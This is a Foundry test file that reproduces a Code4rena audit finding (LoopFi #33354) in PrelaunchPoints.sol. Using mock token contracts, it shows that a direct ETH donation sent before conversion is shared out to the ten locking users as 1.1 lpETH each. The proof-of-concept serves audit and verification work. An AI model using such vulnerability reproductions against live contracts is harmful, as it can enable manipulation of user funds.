// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import "../src/loop/PrelaunchPoints.sol";

contract LoopMockWETH {
    function deposit() external payable {}
    function withdraw(uint256) external {}
    function transfer(address, uint256) external pure returns (bool) { return true; }
}

contract LoopMockLpETH is ILpETH {
    string public name = "lpETH";
    string public symbol = "lpETH";
    uint8 public decimals = 18;
    uint256 public override totalSupply;
    mapping(address => uint256) public override balanceOf;
    mapping(address => mapping(address => uint256)) public override allowance;

    function deposit(address receiver) external payable override returns (uint256 minted) {
        minted = msg.value;
        totalSupply += minted;
        balanceOf[receiver] += minted;
        emit Transfer(address(0), receiver, minted);
    }
    function approve(address spender, uint256 amount) external override returns (bool) { allowance[msg.sender][spender] = amount; emit Approval(msg.sender, spender, amount); return true; }
    function transfer(address to, uint256 amount) external override returns (bool) { balanceOf[msg.sender] -= amount; balanceOf[to] += amount; emit Transfer(msg.sender, to, amount); return true; }
    function transferFrom(address from, address to, uint256 amount) external override returns (bool) { uint256 a = allowance[from][msg.sender]; if (a != type(uint256).max) allowance[from][msg.sender] = a - amount; balanceOf[from] -= amount; balanceOf[to] += amount; emit Transfer(from, to, amount); return true; }
}

/// Reproduces Code4rena LoopFi #33354 against the audited PrelaunchPoints.sol.
contract PoC_33354 is Test {
    PrelaunchPoints internal points;
    LoopMockLpETH internal lpETH;
    LoopMockWETH internal weth;
    address[10] internal users;

    function setUp() public {
        weth = new LoopMockWETH();
        lpETH = new LoopMockLpETH();
        points = new PrelaunchPoints(address(0xCAFE), address(weth), new address[](0));
        for (uint256 i; i < users.length; ++i) {
            users[i] = address(uint160(0x1000 + i));
            vm.deal(users[i], 1 ether);
            vm.prank(users[i]);
            points.lockETH{value: 1 ether}(bytes32(i));
        }
        // Setting addresses after users have locked ETH resets loopActivation;
        // this is the real deployment sequence in which donations are possible
        // before convertAllETH is called by the authorized owner.
        points.setLoopAddresses(address(lpETH), address(0xBEEF));
    }

    function testDonationInflatesRealPrelaunchClaims() public {
        assertEq(points.totalSupply(), 10 ether);
        assertEq(points.balances(users[0], points.ETH()), 1 ether);
        vm.warp(uint256(points.loopActivation()) + 7 days + 1);
        // A direct ETH donation is accepted by PrelaunchPoints.receive().
        (bool sent,) = address(points).call{value: 1 ether}("");
        assertTrue(sent);

        points.convertAllETH();
        assertEq(points.totalSupply(), 10 ether);
        assertEq(points.totalLpETH(), 11 ether);

        vm.warp(uint256(points.startClaimDate()) + 1);
        uint256 totalClaimed;
        address eth = points.ETH();
        for (uint256 i; i < users.length; ++i) {
            assertEq(points.balances(users[i], eth), 1 ether);
            vm.prank(users[i]);
            points.claim(eth, 100, PrelaunchPoints.Exchange.UniswapV3, "");
            assertEq(lpETH.balanceOf(users[i]), 1.1 ether);
            totalClaimed += lpETH.balanceOf(users[i]);
        }
        // The ten locked ETH accounts claim all eleven lpETH, including the
        // donated ETH; each claimant receives 10% more than they locked.
        assertEq(totalClaimed, 11 ether);
        assertEq(lpETH.balanceOf(address(points)), 0);
    }
}
